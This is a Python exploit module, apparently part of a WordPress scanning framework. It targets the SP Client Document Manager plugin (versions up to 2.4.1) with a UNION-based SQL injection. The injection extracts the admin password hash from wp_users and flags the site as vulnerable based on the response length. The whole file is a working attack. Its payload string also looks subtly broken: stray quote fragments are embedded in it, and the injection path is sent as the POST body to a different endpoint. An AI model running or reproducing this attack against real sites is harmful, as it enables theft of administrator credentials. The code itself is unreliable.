from ..exploitsql import ExploitSql


class SPClientDocumentManager(ExploitSql):
	@staticmethod
	def getname():
		return 'SP Client Document Manager'

	@staticmethod
	def getversion():
		return '<= 2.4.1'

	@staticmethod
	def getexploiturl():
		return 'http://www.exploit-db.com/exploits/35313/'

	def exploit(self):
		name = self.getname()
		version = self.getversion()
		headers = {
			'Host': 'server',
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Cookie': 'PHPSESSID=4f7eca4e8ea50fadba7209e47494f29c',
			'Connection': 'keep-alive'
		}
		exploit = '/wp-content/plugins/sp-client-document-manager/ajax.php?function=download-project&id=0%20UNION%20SELECT%201,%202,%203," \
			"%20CONCAT(CAST(CHAR(97,%2058,%2049,%2058,%20123,%20115,%2058,%2054,%2058,%2034,%20118,%20119,%2095,%2099," \
			"%20115,%20115,%2034,%2059,%20115,%2058)%20as%20CHAR),%20LENGTH(user_pass),%20CAST(CHAR(58,%2034)%20as%20CHAR)," \
			"%20user_pass,%20CAST(CHAR(34,%2059,%20125)%20as%20CHAR))%20FROM%20`wp_users`%20WHERE%20ID=1'

		response = ExploitSql.request(
			self.hostname + '/wp-content/plugins/sp-client-document-manager/ajax.php?function=email-vendor',
			data=exploit, headers=headers, method='POST')
		if response:
			if len(response) == 34:
				ExploitSql.exploitfound(name, version, self.getexploiturl())
			else:
				ExploitSql.exploitnotfound(name, version)
		else:
			ExploitSql.exploitnotfound(name, version)


